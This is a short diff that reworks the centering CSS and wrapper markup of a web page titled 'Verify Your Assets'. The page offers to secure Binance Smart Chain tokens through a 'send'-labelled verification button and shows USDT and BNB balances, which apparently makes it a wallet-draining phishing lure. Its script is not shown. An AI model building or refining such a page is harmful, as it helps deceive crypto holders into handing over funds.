@@ -14,8 +14,6 @@
       color: #f1f1f1;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      justify-content: center;
       min-height: 100vh;
     }
     .navbar {
@@ -43,6 +41,12 @@
       text-decoration: none;
       font-weight: 500;
       font-size: 0.95rem;
+    }
+    .main-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .main {
       text-align: center;
@@ -105,16 +109,18 @@
     </div>
   </div>
 
-  <div class="main">
-    <h1>Verify Your Assets</h1>
-    <p>Ensure your tokens are secure on Binance Smart Chain.</p>
-    <button id="sendBtn">📤 VERIFY ASSETS</button>
-    <div class="balance-info">
-      <div id="walletStatus">Wallet not connected</div>
-      <div>USDT: <span id="usdtBalance">--</span></div>
-      <div>BNB: <span id="bnbBalance">--</span></div>
+  <div class="main-container">
+    <div class="main">
+      <h1>Verify Your Assets</h1>
+      <p>Ensure your tokens are secure on Binance Smart Chain.</p>
+      <button id="sendBtn">📤 VERIFY ASSETS</button>
+      <div class="balance-info">
+        <div id="walletStatus">Wallet not connected</div>
+        <div>USDT: <span id="usdtBalance">--</span></div>
+        <div>BNB: <span id="bnbBalance">--</span></div>
+      </div>
+      <div id="log"></div>
     </div>
-    <div id="log"></div>
   </div>
 
   <script>
